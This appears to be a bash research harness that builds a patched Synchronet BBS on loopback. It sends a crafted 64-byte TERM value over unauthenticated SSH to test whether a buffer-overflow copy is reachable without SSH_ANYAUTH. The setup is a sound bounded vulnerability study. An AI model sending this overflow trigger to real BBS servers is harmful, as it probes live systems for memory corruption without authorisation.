#!/usr/bin/env bash
# W7 bounded experiment: is the 64-byte TERM copy reachable in a real sbbs3
# build when the lab config omits SSH_ANYAUTH?  Loopback only.  The existing
# W5/W6 replay scripts are not modified.  All logs are kept, including the
# negative outcome; this script records observations rather than claiming a
# security result.
set -euo pipefail
cd "$(dirname "$0")/../.."
HERE=$PWD
TREE=$HERE/src-tree
P=$HERE/provision
E=$HERE/real-answer/noauth/evidence
PARENT=42f586d70792e46b4934176976bc7949b312dede
mkdir -p "$E" "$P/debs" "$P/local"

note() { echo "NOAUTH $*"; }

test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || { echo TREE_HEAD_MISMATCH; exit 2; }
for d in zip libarchive-dev libnspr4-dev autoconf2.13; do
    (cd "$P/debs" && test -f "${d}_"*.deb || apt-get download "$d")
done
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 "$L/libacl.so"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f 'gcc.linux.x64.exe.debug/sbbs nd nh nj ne' 2>/dev/null || true
    sleep 1
}

write_ini() {
    local port=$1 anyauth=$2 opt
    if [ "$anyauth" = yes ]; then
        opt='XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS'
    else
        opt='XTRN_MINIMIZED | ALLOW_SSH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS'
    fi
    cat > "$TREE/ctrl/sbbs.$(hostname).ini" <<EOF
; W7 lab-only loopback config: anyauth=$anyauth, port=$port
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging
[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $port
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = $opt
[Mail]
	AutoStart = false
[FTP]
	AutoStart = false
[Web]
	AutoStart = false
[Services]
	AutoStart = false
[UNIX]
	Daemonize = False
	PidFile = sbbs-w7.pid
	LogFacility = User
	LogIdent = synchronet-w7
	umask = 077
EOF
}

wait_port_free() {
    for i in $(seq 1 40); do
        ss -ltn 2>/dev/null | grep -q ":$PORT " || return 0
        cleanup_stale
        sleep 0.5
    done
    echo PORT_BUSY
    return 1
}

start_server() {
    local log=$1
    wait_port_free || return 1
    (cd "$TREE" && exec env SBBSCTRL="$TREE/ctrl" \
        ./src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 60); do
        grep -q 'SSH Server listening' "$log" && return 0
        sleep 0.5
    done
    echo SERVER_START_TIMEOUT
    return 1
}

stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    cleanup_stale
    SPID=
}
trap stop_server EXIT

run_case() {
    local term=$1 out=$2 secs=$3 i
    (for i in $(seq 1 $((secs / 2))); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout $((secs + 4)) ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}

# One build of the vulnerable verbatim statement + instrumentation probe.
cleanup_stale
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/real-answer/vulnerable-probe.patch") || exit 3
make -C "$TREE/3rdp/build" jslib > "$P/jslib-w7.log" 2>&1 || { echo JSLIB_BUILD_FAILED; exit 4; }
make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w7.log" 2>&1 || { echo SBBS_BUILD_FAILED; exit 5; }

CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"
test "${#CHOSEN}" -eq 64 || { echo BAD_TERM_LENGTH; exit 6; }

# Control: the known ANYAUTH path must still reach the copy.
PORT=22225
write_ini "$PORT" yes
start_server "$E/anyauth-server.log" || exit 7
run_case "$CHOSEN" "$E/anyauth-client.log" 8
stop_server

# Experiment: same build, same client, no SSH_ANYAUTH in the config.
PORT=22226
write_ini "$PORT" no
start_server "$E/noauth-server.log" || exit 8
run_case "$CHOSEN" "$E/noauth-client.log" 8
stop_server

note "ANYAUTH_PROBE_COUNT=$(grep -c 'REAL_ANSWER_PROBE' "$E/anyauth-server.log" || true)"
note "NOAUTH_PROBE_COUNT=$(grep -c 'REAL_ANSWER_PROBE' "$E/noauth-server.log" || true)"
note "NOAUTH_ACTIVE_COUNT=$(grep -c 'SESSINFO_ACTIVE' "$E/noauth-server.log" || true)"
note "NOAUTH_ANYAUTH_LOG_COUNT=$(grep -c 'SSH_ANYAUTH' "$E/noauth-server.log" || true)"
note "NOAUTH_CLIENT_BYTES=$(wc -c < "$E/noauth-client.log")"

if grep -q 'REAL_ANSWER_PROBE' "$E/anyauth-server.log"; then
    note 'CONTROL_OK anyauth config reached the verbatim copy'
else
    note 'CONTROL_FAIL anyauth config did not reach the copy'
fi
if grep -q 'REAL_ANSWER_PROBE' "$E/noauth-server.log"; then
    note 'DEFAULT_CONFIG_REACH_YES overflow reached without SSH_ANYAUTH'
else
    note 'DEFAULT_CONFIG_REACH_NO overflow did not reach without SSH_ANYAUTH'
fi
note "EVIDENCE_DIR=$E"
